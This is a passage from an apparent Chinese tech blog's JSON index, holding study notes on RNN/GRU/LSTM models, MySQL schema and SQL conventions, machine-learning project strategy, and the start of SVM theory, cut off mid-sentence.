对于语料库中部分特殊的、不包含在字典中的词汇，例如人名、地名，可以不必针对这些具体的词，而是在词典中加入一个 UNK（Unique Token）标记来表示。 将标志化后的训练集用于训练 RNN，过程如下图所示： 在第一个时间步中，输入的 $a^{⟨0⟩}$ 和 $x^{⟨1⟩}$ 都是零向量，$\\hat y^{⟨1⟩}$ 是通过 softmax 预测出的字典中每个词作为第一个词出现的概率；在第二个时间步中，输入的 x⟨2⟩是训练样本的标签中的第一个单词 $y^{⟨1⟩}$（即“cats”）和上一层的激活项 $a^{⟨1⟩}$，输出的 $y^{⟨2⟩}$ 表示的是通过 softmax 预测出的、单词“cats”后面出现字典中的其他每个词的条件概率。以此类推，最后就可以得到整个句子出现的概率。 定义损失函数为： L(\\hat y^{⟨t⟩}, y^{⟨t⟩}) = -\\sum_t y_i^{⟨t⟩} log \\hat y^{⟨t⟩}则成本函数为： J = \\sum_t L^{⟨t⟩}(\\hat y^{⟨t⟩}, y^{⟨t⟩}) 采样在训练好一个语言模型后，可以通过 采样（Sample） 新的序列来了解这个模型中都学习到了一些什么。 在第一个时间步输入 $a^{⟨0⟩}$ 和 $x^{⟨1⟩}$ 为零向量，输出预测出的字典中每个词作为第一个词出现的概率，根据 softmax 的分布进行随机采样（np.random.choice），将采样得到的 $\\hat y^{⟨1⟩}$ 作为第二个时间步的输入 $x^{⟨2⟩}$ 。以此类推，直到采样到 EOS，最后模型会自动生成一些句子，从这些句子中可以发现模型通过语料库学习到的知识。 这里建立的是基于词汇构建的语言模型。根据需要也可以构建基于字符的语言模型，其优点是不必担心出现未知标识（UNK），其缺点是得到的序列过多过长，并且训练成本高昂。因此，基于词汇构建的语言模型更为常用。 RNN 的梯度消失The cat,which already ate a bunch of food, was full.The cats,which already ate a bunch of food, were full. 对于以上两个句子，后面的动词单复数形式由前面的名词的单复数形式决定。但是基本的 RNN 不擅长捕获这种长期依赖关系。究其原因，由于梯度消失，在反向传播时，后面层的输出误差很难影响到较靠前层的计算，网络很难调整靠前的计算。 在反向传播时，随着层数的增多，梯度不仅可能指数型下降，也有可能指数型上升，即梯度爆炸。不过 梯度爆炸 比较容易发现，因为参数会急剧膨胀到数值溢出（可能显示为 NaN）。这时可以采用梯度修剪（Gradient Clipping）来解决：观察梯度向量，如果它大于某个阈值，则缩放梯度向量以保证其不会太大。相比之下，梯度消失问题更难解决。LSTM 和 GRU 的设计就是为了解决长期依赖问题，都可以作为缓解梯度消失问题的方案。 GRU（门控循环单元）GRU（Gated Recurrent Units, 门控循环单元）改善了 RNN 的隐藏层，使其可以更好地捕捉深层连接，并改善了梯度消失问题。 The cat,which already ate a bunch of food, was full. 当我们从左到右读上面这个句子时，GRU 单元有一个新的变量称为 c，代表记忆细胞（Memory Cell），其作用是提供记忆的能力，记住例如前文主语是单数还是复数等信息。在时间 t，记忆细胞的值 $c^{⟨t⟩}$ 等于输出的激活值 $a^{⟨t⟩}$；$\\tilde c^{⟨t⟩}$ 代表下一个 c 的候选值。$Γ_u$ 代表 更新门（Update Gate），用于决定什么时候更新记忆细胞的值。以上结构的具体公式为： 当使用 sigmoid 作为激活函数 $σ$ 来得到 $Γ_u$时，Γu 的值在 0 到 1 的范围内，且大多数时间非常接近于 0 或 1。当 $Γ_u = 1$时，$c^{⟨t⟩}$被更新为 $\\tilde c^{⟨t⟩}$，否则保持为 $c^{⟨t-1⟩}$。因为 $Γ_u$ 可以很接近 0，因此 $c^{⟨t⟩}$ 几乎就等于 $c^{⟨t-1⟩}$。在经过很长的序列后，c 的值依然被维持，从而实现“记忆”的功能。 以上实际上是简化过的 GRU 单元，但是蕴涵了 GRU 最重要的思想。完整的 GRU 单元添加了一个新的相关门（Relevance Gate） $Γ_r$，表示 $\\tilde c^{⟨t⟩}$和 $c^{⟨t⟩}$ 的相关性。因此，表达式改为如下所示： 相关论文： ho et al., 2014. On the properties of neural machine translation: Encoder-decoder approaches Chung et al., 2014. Empirical Evaluation of Gated Recurrent Neural Networks on Sequence Modeling LSTM（长短期记忆）LSTM（Long Short Term Memory，长短期记忆）网络比 GRU 更加灵活和强大，它额外引入了遗忘门（Forget Gate） $Γ_f$和输出门（Output Gate） $Γ_o$。公式如下： 将多个 LSTM 单元按时间次序连接起来，就得到一个 LSTM 网络。 以上是简化版的 LSTM。在更为常用的版本中，几个门值不仅取决于 $a^{⟨t-1⟩}$ 和 $x^{⟨t⟩}$，有时也可以偷窥上一个记忆细胞输入的值 $c^{⟨t-1⟩}$，这被称为窥视孔连接（Peephole Connection)。这时，和 GRU 不同，$c^{⟨t-1⟩}$ 和门值是一对一的。 Tensorflow 官网推荐了一篇 [伟大的文章](#https://colah.github.io/posts/2015-08-Understanding-LSTMs/)， 特别介绍递归神经网络和LSTM 相关论文：Hochreiter &amp; Schmidhuber 1997. Long short-term memory 双向循环神经网络（BRNN）单向的循环神经网络在某一时刻的预测结果只能使用之前输入的序列信息。双向循环神经网络（Bidirectional RNN，BRNN）可以在序列的任意位置使用之前和之后的数据。其工作原理是增加一个反向循环层，结构如下图所示： 因此，有 y^{⟨t⟩} = g(W_y[\\overrightarrow a^{⟨t⟩}, \\overleftarrow a^{⟨t⟩}] + b_y)这个改进的方法不仅能用于基本的 RNN，也可以用于 GRU 或 LSTM。缺点 是需要完整的序列数据，才能预测任意位置的结果。例如构建语音识别系统，需要等待用户说完并获取整个语音表达，才能处理这段语音并进一步做语音识别。因此，实际应用会有更加复杂的模块。 深度循环神经网络（DRNN)循环神经网络的每个时间步上也可以包含多个隐藏层，形成深度循环神经网络（Deep RNN)。结构如下图所示： 以 $a^{[2]⟨3⟩}$ 为例，有 $a^{[2]⟨3⟩} = g(W_a^{[2]}[a^{[2]⟨2⟩}, a^{[1]⟨3⟩}] + b_a^{[2]})$ 代码示例循环序列模型","link":"/2018/02/27/%E5%BE%AA%E7%8E%AF%E8%AE%AD%E7%BB%83%E6%A8%A1%E5%9E%8B/"},{"title":"数据库规约解读","text":"**适用场景：并发量大、数据量大的互联网业务** 基础规范1、必须使用InnoDB存储引擎解读：支持事务、行级锁、并发性能更好、CPU及内存缓存页优化使得资源利用率更高 2、新库默认使用utf8mb4字符集解读：utf8mb4和utf8都是万国码，无需转码，无乱码风险。其中utf8mb4是utf8的超集，emoji表情以及部分不常见汉字在utf8下会表现为乱码，故需要升级至utf8mb4。 3、数据表、数据字段必须加入中文注释解读：N年后没谁知道这个r1,r2,r3字段是干嘛的。不过也有人提出，加入注释会方便黑客，建议“注释写在文档里，文档和数据库同步更新”。这个建议根据经验来说是不太靠谱的：（1）不能怕bug就不写代码，怕黑客就不写注释，对吧？（2）文档同步更新也不太现实，还是把注释写好，代码可读性做好更可行，互联网公司的文档管理？呆过互联网公司的同学估计都清楚 4、禁止使用存储过程、视图、触发器、Event解读：军规的背景是“并发量大、数据量大的互联网业务”，这类业务架构设计的重点往往是吞吐量，性能优先（和钱相关的少部分业务是一致性优先），对数据库性能影响较大的数据库特性较少使用。这类场景的架构方向是“解放数据库CPU，把复杂逻辑计算放到服务层”，服务层具备更好的扩展性，容易实现“增机器就扩充性能”，数据库擅长存储与索引，勿让数据库背负过重的任务。 有人质疑某些军规不合理，完全做到不可能，任何事情都没有百分之百，针对业务特性设计架构，总有方案替代，等单库吞吐量到了几千上万，就明白这些军规的重要性了。 5、禁止存储大文件或者大照片解读：为何要让数据库做它不擅长的事情？大文件和照片存储在文件系统，数据库里存URI多好 命名规范6、只允许使用内网域名，而不是ip连接数据库&lt;/font&gt;解读：不只是数据库，缓存（memcache、redis）的连接，服务（service）的连接都必须使用内网域名，机器迁移/平滑升级/运维管理……太多太多的好处 7、线上环境、开发环境、测试环境数据库内网域名遵循命名规范业务名称：xxx线上环境：dj.xxx.db开发环境：dj.xxx.rdb测试环境：dj.xxx.tdb从库在名称后加-s标识，备库在名称后加-ss标识线上从库：dj.xxx-s.db线上备库：dj.xxx-sss.db 8、库名、表名、字段名：小写，下划线风格，不超过32个字符，必须见名知意，禁止拼音英文混用 9、表名t_xxx，非唯一索引名idx_xxx，唯一索引名uniq_xxx 表设计规范10、单实例表数目必须小于500 11、单表列数目必须小于30 12、表必须有主键，例如自增主键解读：a）主键递增，数据行写入可以提高插入性能，可以避免page分裂，减少表碎片提升空间和内存的使用b）主键要选择较短的数据类型， Innodb引擎普通索引都会保存主键的值，较短的数据类型可以有效的减少索引的磁盘空间，提高索引的缓存效率c） 无主键的表删除，在row模式的主从架构，会导致备库夯住 13、禁止使用外键，如果有外键完整性约束，需要应用程序控制解读：外键会导致表与表之间耦合，update与delete操作都会涉及相关联的表，十分影响sql 的性能，甚至会造成死锁。高并发情况下容易造成数据库性能，大数据高并发业务场景数据库使用以性能优先 字段设计规范14、必须把字段定义为NOT NULL并且提供默认值解读：a）null的列使索引/索引统计/值比较都更加复杂，对MySQL来说更难优化b）null 这种类型MySQL内部需要进行特殊处理，增加数据库处理记录的复杂性；同等条件下，表中有较多空字段的时候，数据库的处理性能会降低很多c）null值需要更多的存储空，无论是表还是索引中每行中的null的列都需要额外的空间来标识d）对null 的处理时候，只能采用is null或is not null，而不能采用=、in、&lt;、&lt;&gt;、!=、not in这些操作符号。如：where name!=’shenjian’，如果存在name为null值的记录，查询结果就不会包含name为null值的记录 15、禁止使用TEXT、BLOB类型解读：会浪费更多的磁盘和内存空间，非必要的大量的大字段查询会淘汰掉热数据，导致内存命中率急剧降低，影响数据库性能 16、禁止使用小数存储货币解读：使用整数吧，小数容易导致钱对不上。有人可能会问存储前乘以100，取出后除以100是否可行，个人建议“尽量少的使用除法”。曾经踩过这样的坑，100元分3天摊销，每天摊销100/3元，结果得到3个33.33。后来实施对账系统，始终有几分钱对不齐，郁闷了很久，最后发现是除法惹的祸。解决方案：使用“分”作为单位，这样数据库里就是整数了。 17、必须使用varchar(20)存储手机号解读：a）涉及到区号或者国家代号，可能出现+-()b）手机号会去做数学运算么？c）varchar可以支持模糊查询，例如：like“138%” 18、禁止使用ENUM，可使用TINYINT代替解读：a）增加新的ENUM值要做DDL操作b）ENUM的内部实际存储就是整数，你以为自己定义的是字符串？ 索引设计规范19、单表索引建议控制在5个以内 20、单索引字段数不允许超过5个解读：字段超过5个时，实际已经起不到有效过滤数据的作用了 21、禁止在更新十分频繁、区分度不高的属性上建立索引解读：a）更新会变更B+树，更新频繁的字段建立索引会大大降低数据库性能b）“性别”这种区分度不大的属性，建立索引是没有什么意义的，不能有效过滤数据，性能与全表扫描类似 22、建立组合索引，必须把区分度高的字段放在前面解读：能够更加有效的过滤数据 SQL使用规范23、禁止使用SELECT *，只获取必要的字段，需要显示说明列属性解读：a）读取不需要的列会增加CPU、IO、NET消耗b）不能有效的利用覆盖索引c）使用SELECT *容易在增加或者删除字段后出现程序BUG 24、禁止使用INSERT INTO t_xxx VALUES(xxx)，必须显示指定插入的列属性解读：容易在增加或者删除字段后出现程序BUG 25、禁止使用属性隐式转换解读：SELECT uid FROM t_user WHERE phone=13812345678 会导致全表扫描，而不能命中phone索引。phone是varchar类型，SQL语句带入的是整形，故不会命中索引，加个引号就好了：SELECT uid FROM t_user WHERE phone=’13812345678’ 26、禁止在WHERE条件的属性上使用函数或者表达式解读：SELECT uid FROM t_user WHERE from_unixtime(day)&gt;=’2017-02-15’ 会导致全表扫描正确的写法是：SELECT uid FROM t_user WHERE day&gt;= unix_timestamp(‘2017-02-15 00:00:00’) 27、禁止负向查询，以及%开头的模糊查询解读：a）负向查询条件：NOT、!=、&lt;&gt;、!&lt;、!&gt;、NOT IN、NOT LIKE等，会导致全表扫描b）%开头的模糊查询，会导致全表扫描 28、禁止大表使用JOIN查询，禁止大表使用子查询解读：会产生临时表，消耗较多内存与CPU，极大影响数据库性能 29、禁止使用OR条件，必须改为IN查询解读：旧版本Mysql的OR查询是不能命中索引的，即使能命中索引，为何要让数据库耗费更多的CPU帮助实施查询优化呢？ 30、应用程序必须捕获SQL异常，并有相应处理 行为准则31、禁止使用应用程序配置文件内的帐号手工访问线上数据库32、禁止非DBA对线上数据库进行写操作，修改线上数据需要提交工单，由DBA执行，提交的SQL语句必须经过测试33、分配非DBA以只读帐号，必须通过VPN+跳板机访问授权的从库34、开发、测试、线上环境隔离","link":"/2017/03/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A7%84%E7%BA%A6%E8%A7%A3%E8%AF%BB/"},{"title":"机器学习开发策略","text":"吴大大结构化机器学习项目总结，完善中… ML策略假设你构建了一个喵咪分类器，训练之后准确率达到90%，但在测试集上还不够好。此时你可以想到的优化方法有哪些呢？总结后大致如下： 收集更多的数据 收集更多的多样化训练集，比如不同姿势的猫咪图片等 用梯度下降法训练更长时间 尝试Adam算法 尝试更大的网路 尝试小一点的网络 尝试dropout随机失活算法 加上L2正则项 改善网络结构，如变更激活函数，变更隐藏层节点数量 优化的方法虽然很多，但如果方向错误，可能白费几个月时间。那通过哪些策略可以减少错误发生的几率呢？怎么判断哪些方法可以尝试，哪些方法可以丢弃呢？ 正交化 Orthogonalization优化前首先需要明白正交化。教科书式定义（可以直接略过 =。=）：正交化是一种系统设计属性，它确保修改指令或算法的组成部分不会对系统的其他组件产生或传播副作用。独立地验证某部分而不对其他部分产生影响，能有效减少测试和开发时间。 正交性很好理解，就像以前的老式黑白电视机，它有很多调节画面的旋钮。假设第一个旋钮控制上下方向，第二个旋钮控制左右方向。当我们需要调节画面时，调节上下方向不会影响左右方向。这样互不影响的设计能大大减少调节画面的时间。 同样，要弄好一个监督学习系统，我们也需要考虑系统的旋钮。通常我们需要保证下面四个方面是正交的。 首先系统在训练集上表现良好 如果拟合不好，那么尝试使用更大的神经网络或者切换更好的优化算法，比如Adam等 其次系统在开发集上表现良好 如果拟合不好，尝试正则化或者更大的训练集 然后系统在测试集上表现良好 如果拟合不好，尝试更大的开发集 最后系统在真实(生产)环境中表现良好 如果表现不好，意味着开发测试集分布设置可能不对，或者损失函数不能有效反映算法在现实世界的表现 我们需要使用正交化的思想去分析系统的瓶颈究竟出自哪一个方面，当系统表现不佳时，哪些旋钮是值得去尝试的。尝试过程中需要训练网络，吴大大在这特意提到，他自己训练神经网络时通常不会提前停止网络训练，因为这会让问题的分析复杂化。比如提前停止训练集的训练，它在影响训练集的拟合的同时会改善开发集的表现，这样问题就不正交化了。 单一数字评估指标 Single number evaluation metric当我们知道模型在哪个集合拟合不好时，我们就有了优化的方向。无论是调整超参数，还是尝试更好的优化算法，为了更好更快的重新评估模型，我们都需要为问题设置一个单一的数字评估指标。 下面是分别训练的两个分类器的 Precision(精准率)、Recall（召回率）以及F1 score。 由上表可以看出，以 Precision 为指标，则分类器 A 的分类效果好；以 Recall 为指标，则分类器 B 的分类效果好。所以仅用以上判定指标，我们有时很难决定出 A 好还是 B 好。 这里以 Precision 和 Recall 为基础，构成一个综合指标 F1 Score ，那么我们利用F1 Score便可以更容易的评判出分类器A的效果更好。 指标介绍： 在二分类问题中，通过预测我们得到下面的真实值 y 和预测值 y^ 的表： Precision（精准率）： $Precision = \\dfrac{True\\ positive}{Number\\ of\\ predicted\\ positive} \\times 100\\%= \\dfrac{True\\ positive}{True\\ positive + False\\ positive}$ 假设在是否为猫的分类问题中，查准率代表：所有模型预测为猫的图片中，确实为猫的概率。 Recall（召回率）：$Recall = \\dfrac{True\\ positive}{Number\\ of\\ actually\\ positive} \\times 100\\%= \\dfrac{True\\ positive}{True\\ positive + False\\ negative}$ 假设在是否为猫的分类问题中，查全率代表：真实为猫的图片中，预测正确的概率。 F1 Score： $vF1-Socre = \\dfrac {2} {\\dfrac{1}{p}+\\dfrac{1}{r}}$ 相当与精准率和召回率的一个特别形式的平均指标。 示例：下面是另外一个问题多种分类器在不同的国家中的分类错误率结果： 模型在各个地区有不同的表现，这里用地区的平均值来对模型效果进行评估，转换为单一数字评估指标，就可以很容易的得出表现最好的模型。 满足和优化指标有时候把我们所有顾及的事情组成单一数字评估指标并不容易。这个时候，可以尝试把指标划分为满足指标和优化指标。 比如现在有三个不同的分类器性能表现如下： 假设我们对模型效果有一定的要求，不仅要求准确率，还要求运行时间在100 ms以内。那么我们可以以 Accuracy 为优化指标，以 Running time 为满足指标。一旦Running time达到要求，我们就可以把全部精力放在优化指标上。以这个思想，我们很快可以从中选出B是满足条件的最好的分类器。 一般的，如果要考虑N个指标，则选择一个指标为优化指标，其他N-1个指标都是满足指标： N_{metric}:\\left\\{ \\begin{array}{l} 1\\qquad \\qquad \\qquad Optimizing\\ metric\\\\ N_{metric}-1\\qquad Satisificing\\ metric \\end{array} \\right. 训练/开发/测试集划分确立了评估指标，就是确定了靶心，团队拿到数据就可以快速迭代不断逼近指标。这个时候正确的数据集的划分就非常重要了，它直接关乎你的团队效率。 我们知道训练集是用来训练模型的，开发集(也要交叉验证集)用来尝试迭代各种想法，用来优化性能，得到一个满意的损失结果后，最后用测试集评估。 现在假设有这样的一个数据集，需要将他们划分为开发集和测试集， 有些人可能会随机选择几个国家的作为开发集，剩下的作为测试集，就如下图所示。 有些人可能觉得没问题，其实问题很大！因为开发集和测试集不服从同一分布，这就好像你在准备托福考试，你尽可能的得到了所有的考试技巧和其他资料，最后你的确得到了不错的成绩。但是后来因为工作需求需要你会说俄语，此时如果你用之前托福的资料来对付俄语考试则显然不对，这也就是为什么有时候开发集准确率高，但是测试集低。 所以数据要随机洗牌，然后放到训练、开发和测试集中。其次，这些随机洗牌的数据的来源也需要注意，即你选择的数据集，要能反应出你未来希望得到的数据，即模型数据要和未来数据相似，这样模型在生产环境中面对新的数据才能有好的表现。 开发集和测试集的大小机器学习发展到现在，数据集的划分与传统稍有不同。具体详情见下图： 开发集有时候需要足够大才能评估不同的想法，至于测试集的量，除非你对最终投产的系统有非常高的精准指标，否则一般情况下，1W的数据量足够。注意测试集的划分不再需要按照传统占据30%，以现在的数据量，30%很可能超过百万。 什么时候该改变开发集/测试集和指标在针对某一问题我们设置开发集和评估指标后，这就像把目标定在某个位置，后面的过程就聚焦在该位置上。但有时候在这个项目的过程中，可能会发现目标的位置设置错了，所以要移动改变我们的目标。 example1 假设有两个猫的图片的分类器： 评估指标：分类错误率 算法A：3%错误率 算法B：5%错误率 这样来看，算法A的表现更好。但是在实际的测试中，算法A可能因为某些原因，将很多色情图片分类成了猫。所以当我们在线上部署的时候，算法A会给爱猫人士推送更多更准确的猫的图片（因为其误差率只有3%），但同时也会给用户推送一些色情图片，这是不能忍受的。所以，虽然算法A的错误率很低，但是它却不是一个好的算法。 这个时候我们就需要改变开发集、测试集或者评估指标。 假设开始我们的评估指标如下：$Error = \\dfrac{1}{m{dev}}\\sum\\limits{i=1}^{m{dev}}I{y^{(i)}{pred}\\neq y^{(i)}}$ 该评估指标对色情图片和非色情图片一视同仁，但是我们希望，分类器不会错误将色情图片标记为猫。 修改的方法，在其中加入权重$w^{(i)}$： $Error = \\dfrac{1}{\\sum w^{(i)}}\\sum\\limits{i=1}^{m{dev}} w^{(i)}I{y^{(i)}_{pred}\\neq y^{(i)}}$其中： w^{(i)}=\\left\\{ \\begin{array}{l} 1\\qquad \\qquad \\qquad 如果x^{(i)}不是色情图片\\\\ 10或100\\qquad \\qquad如果x^{(i)}是色情图片 \\end{array} \\right.这样通过设置权重，当算法将色情图片分类为猫时，误差项会快速变大。总结来说就是：如果评估指标无法正确评估算法的排名，则需要重新定义一个新的评估指标。 example2 同样针对example1中的两个不同的猫图片的分类器A和B。 但实际情况是对，我们一直使用的是网上下载的高质量的图片进行训练；而当部署到手机上时，由于图片的清晰度及拍照水平的原因，当实际测试算法时，会发现算法B的表现其实更好。 如果在训练开发测试的过程中得到的模型效果比较好，但是在实际应用中自己所真正关心的问题效果却不好的时候，就需要改变开发、测试集或者评估指标。 Guideline： 定义正确的评估指标来更好的给分类器的好坏进行排序； 优化评估指标。 比较人类表现水平很多机器学习模型的诞生是为了取代人类的工作，因此其表现也会跟人类表现水平作比较。 上图展示了随着时间的推进，机器学习系统和人的表现水平的变化。一般的，当机器学习超过人的表现水平后，它的进步速度逐渐变得缓慢，最终性能无法超过某个理论上限，这个上限被称为贝叶斯最优误差（Bayes Optimal Error）。 贝叶斯最优误差一般认为是理论上可能达到的最优误差，换句话说，其就是理论最优函数，任何从 x 到精确度 y 映射的函数都不可能超过这个值。例如，对于语音识别，某些音频片段嘈杂到基本不可能知道说的是什么，所以完美的识别率不可能达到 100%。 因为人类对于一些自然感知问题的表现水平十分接近贝叶斯最优误差，所以当机器学习系统的表现超过人类后，就没有太多继续改善的空间了。 也因此，只要建立的机器学习模型的表现还没达到人类的表现水平时，就可以通过各种手段来提升它。例如采用人工标记过的数据进行训练，通过人工误差分析了解为什么人能够正确识别，或者是进行偏差、方差分析。 当模型的表现超过人类后，这些手段起的作用就微乎其微了。 可避免偏差通过与贝叶斯最优误差，或者说，与人类表现水平的比较，可以表明一个机器学习模型表现的好坏程度，由此判断后续操作应该注重于减小偏差还是减小方差。 模型在训练集上的误差与人类表现水平的差值被称作可避免偏差（Avoidable Bias）。可避免偏差低便意味着模型在训练集上的表现很好，而训练集与验证集之间错误率的差值越小，意味着模型在验证集与测试集上的表现和训练集同样好。 如果可避免偏差大于训练集与验证集之间错误率的差值，之后的工作就应该专注于减小偏差；反之，就应该专注于减小方差。 理解人类表现水平我们一般用人类水平误差（Human-level Error）来代表贝叶斯最优误差（或者简称贝叶斯误差）。对于不同领域的例子，不同人群由于其经验水平不一，错误率也不同。一般来说，我们将表现最好的作为人类水平误差。但是实际应用中，不同人选择人类水平误差的基准是不同的，这会带来一定的影响。 例如，如果某模型在训练集上的错误率为 0.7%，验证集的错误率为 0.8%。如果选择的人类水平误差为 0.5%，那么偏差（bias）比方差（variance）更加突出；而如果选择的人类水平误差为 0.7%，则方差更加突出。也就是说，根据人类水平误差的不同选择，我们可能因此选择不同的优化操作。 这种问题只会发生在模型表现很好，接近人类水平误差的时候才会出现。人类水平误差给了我们一种估计贝叶斯误差的方式，而不是像之前一样将训练的错误率直接对着 0% 的方向进行优化。 当机器学习模型的表现超过了人类水平误差时，很难再通过人的直觉去判断模型还能够往什么方向优化以提高性能。 总结想让一个监督学习算法达到使用程度，应该做到以下两点：1）算法对训练集的拟合很好，可以看作可避免偏差很低；2）推广到验证集和测试集效果也很好，即方差不是很大。 根据正交化的思想，我们有一些措施可以独立地优化二者之一。","link":"/2017/12/10/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BC%80%E5%8F%91%E7%AD%96%E7%95%A5%E6%80%BB%E7%BB%93/"},{"title":"机器学习（三）：SVM","text":"持续更新中。。。 示例代码 SVM目标函数推导 大边界的直观理解与数学解释 核函数 常用核函数及核函数的条件 逻辑回归、SVM和神经网络使用场景 吴恩达SVM视频笔记 支持向量机通俗导论（理解SVM的三层境界） 带核的SVM为什么能分类非线性问题 SVM常见问题 SVM目标函数推导SVM就是寻找一个超平面，将所有的数据点尽可能的分开，而且数据点离超平面距离越远越好。相对逻辑回归和神经网络，SVM在学习复杂的非线性方程时提供了一种更为清晰，更加强大的方式。 SVM 模型可以由 LR 模型推导而来，下面是 LR 的直观理解： LR 单个样本的损失函数： 接着我们对 LR 的代价函数（所有样本）进行转换，首先去掉 1/m 这一项，这也会得出同样的 $\\theta$ 最优值，然后令 $C=1/\\lambda$ 得到代价函数： \\min_\\limits{\\theta}C\\sum_\\limits{i=1}^{m}\\left[y^{(i)}{\\cos}t_{1}\\left(\\theta^{T}x^{(i)}\\right)+\\left(1-y^{(i)}\\right){\\cos}t\\left(\\theta^{T}x^{(i)}\\right)\\right]+\\frac{1}{2}\\sum_\\limits{i=1}^{n}\\theta^{2}_{j}我们最小化这个代价函数，令第一项为0，获得包含参数 $\\theta$ 的第二项，SVM就是用第二项来直接预测值等于0还是1。其实支持向量机做的全部事情，就是极小化参数向量范数的平方，或者说长度的平方。学习参数 $\\theta$ 就是支持向量机假设函数的形式，这就是支持向量机数学上的定义。 根据逻辑回归 $h_\\theta \\left( x \\right)$ 的公式，我们知道当 $\\theta^Tx$ 大于0的话，模型代价函数值为1，类似地，如果你有一个负样本，则仅需要 $\\theta^Tx$ 小于0就会将负例正确分离 。 但是，支持向量机的要求更高，不仅仅要能正确分开输入的样本，即不仅仅要求大于0，我们需要的是比0值大很多，比如大于等于1，我也想这个比0小很多，比如我希望它小于等于-1，这就相当于在支持向量机中嵌入了一个额外的安全因子，或者说安全的间距因子。 所以最小化问题可以转换为： 这就是 SVM 的最终目标函数。 大边界的直观理解与数学解释SVM 不仅需要能分类，还需要较高的鲁棒性，需要努力寻找一个最大间距（下图中的黑色超平面）来分离样本。所以 SVM 有时被称为大间距分类器。 可是为什么 SVM 能得到最大间距分类器呢？我们仍然从 SVM 的目标函数进行分析。 在这之前首先说下 向量内积的相关知识， $\\left|| u |\\right|$表示 u 的范数，即 u 的长度，即向量 u 的欧几里得长度，并且 $\\left|| u \\right||=\\sqrt{u{1}^{2}+u{2}^{2}}$。我们将向量 v 投影到向量 u 上，做一个直角投影，接下来我度量这条红线的长度。我称这条红线的长度为 p ，因此内积 $u^Tv=p\\centerdot \\left|| u |\\right|$。注意，如果 u 和 v 之间的夹角大于90度，内积是个负数。 SVM 的目标函数为： 根据向量内积的知识对目标函数进行转换，同时假设只有两个样本，每个样本只有两个维度，令 $\\theta_0 = 0$，$n = 2$ 得到 现在我们假设有如上图所示的样本分布，那么 SVM 会选择怎样的决策边界呢？ SVM 在分类的时候，为了不让模型过于复杂，会让 $\\theta$ 的范数需要尽可能小，那么相应的，P也就是投影需要尽可能的大。我们知道 SVM 选择的参数 $\\theta$ 的方向是和决策界是90度正交的，所以很明显，下图中，右边的绿色决策边界更理想，因为此刻样本在 $\\theta$ 方向上的投影大很多。这就是为什么支持向量机最终会找到大间距分类器的原因。 \\min_\\limits{\\theta}C\\sum_\\limits{i=1}^{m}\\left[y^{(i)}{\\cos}t_{1}\\left(\\theta^{T}x^{(i)}\\right)+\\left(1-y^{(i)}\\right){\\cos}t\\left(\\theta^{T}x^{(i)}\\right)\\right]+\\frac{1}{2}\\sum_\\limits{i=1}^{n}\\theta^{2}_{j}但是最大间距分类只有当参数 C 是非常大的时候才起效，回顾 $C=1/\\lambda$ ，因此：（1）C 较大时，相当于 $\\lambda$ 较小，可能会导致过拟合，高方差。（2）C 较小时，相当于 $\\lambda$ 较大，可能会导致低拟合，高偏差。 比如你加了上图这个异常样本，为了将样本用最大间距分开，SVM 会将参数 C 设置的非常大，得到红色的决策边界，这是非常不明智的。但是 如果 C 设置的小一点，你最终会得到这条黑线。当 C 不是非常非常大的时候，它可以忽略掉一些异常点的影响，得到更好的决策界。甚至当你的数据不是线性可分的时候，支持向量机也可以给出好的结果。 核函数SVM 在处理非线性可分问题时，会使用核函数。核函数具体怎么来的，可以概括为以下三点：（1）实际中，我们会经常遇到线性不可分的样例，此时，我们的常用做法是把样例特征映射到高维空间中去（2）但是如果凡是遇到线性不可分的样例，一律映射到高维空间，那么这个维度大小高到可怕，几乎不可计算。（3）此时，核函数隆重登场。核函数的价值在于它虽然也是将特征从低维映射到高维，但核函数绝就绝在它事先在低维上进行计算，而将实质上的分类效果表现在了高维上。 下面进行详细说明。 假设有两个样本 X1 和 X2，它们是二维平面的两个坐标。样本分布如图所示 此刻为了线性可分，我们想到一个方法，把样本投射到高纬空间，如图所示 我们知道一条二次曲线（圆圈是二次曲线的一种特殊情况）的方程可以写作这样的形式： 那么对一个二维空间做映射，选择的新空间是原始空间的所有一阶和二阶的组合，会得到五个维度，所以需要映射到五维空间，即R2→R5。假设新的空间的五个坐标的值分别为 Z1=X1, Z2=X1^2, Z3=X2, Z4=X2^2, Z5=X1X2，那么上面的方程在新的坐标系下可以写作 这个过程其实涉及了两个步骤：（1）首先使用一个非线性映射将数据变换到一个高纬特征空间F，（2）然后在高纬特征空间使用内积的公式进行计算，进行线性分类。 但是这里有一个很大的问题，我们对一个二维空间做映射，选择的新空间是原始空间的所有一阶和二阶的组合，得到了五个维度；如果原始空间是三维，那么我们会得到 19 维的新空间，这个数目是呈爆炸性增长的，这给计算带来了非常大的困难，而且如果遇到无穷维的情况，就根本无从计算。 那么怎么办呢？我们首先来看下高纬空间的内积计算（尖括号代表内积计算，$ϕ$ 代表低纬到高纬的映）： 另外，我们又注意到： 二者有很多相似的地方，实际上，我们只要把某几个维度线性缩放一下，然后再加上一个常数维度，具体来说，上面这个式子的计算结果实际上和映射 之后的内积的结果是相等的，那么区别在于什么地方呢？1. 一个是映射到高维空间中，然后再根据内积的公式进行计算；2. 而另一个则直接在原来的低维空间中进行计算，而不需要显式地写出映射后的结果。 我们把这里的计算两个向量在隐式映射过后的空间中的内积的函数叫做核函数。核函数能简化映射空间中的内积运算——刚好“碰巧”的是，在我们的 SVM 里需要计算的地方数据向量总是以内积的形式出现的。 常用的核函数： 刚才所举例子用的就是多项式核（R = 1，d = 2），但是 高斯核 相对而言用的最广泛，注意高斯核与正态分布没什么实际上的关系，只是看上去像而已。 至于线性核，这实际上就是原始空间中的内积。这个核存在的主要目的是使得“映射后空间中的问题”和“映射前空间中的问题”两者在形式上统一起来了(意思是说，我们有时候写代码，或写公式的时候，只要写个通用模板或表达式，然后再代入不同的核，不必要分别写一个线性的和一个非线性的)。 逻辑回归、SVM和神经网络使用场景由逻辑回归的目标函数可以近似推导出不带核函数的 SVM 的目标函数，所以逻辑回归和不带核函数的 SVM 是非常相似的算法，它们通常会做相似的事情，并给出相似的结果。但当模型的复杂度上升，比如当你有多达1万的样本时，也可能是5万，你的特征变量数量就会非常大。在这样一个非常常见的体系里，不带核函数的 SVM 就会表现得尤其突出。 那么如何在 LR 和 SVM 之间进行选择呢？下面是一些普遍使用的准则：n 为特征数，m 为训练样本数。（1）如果相较于 m 而言，n 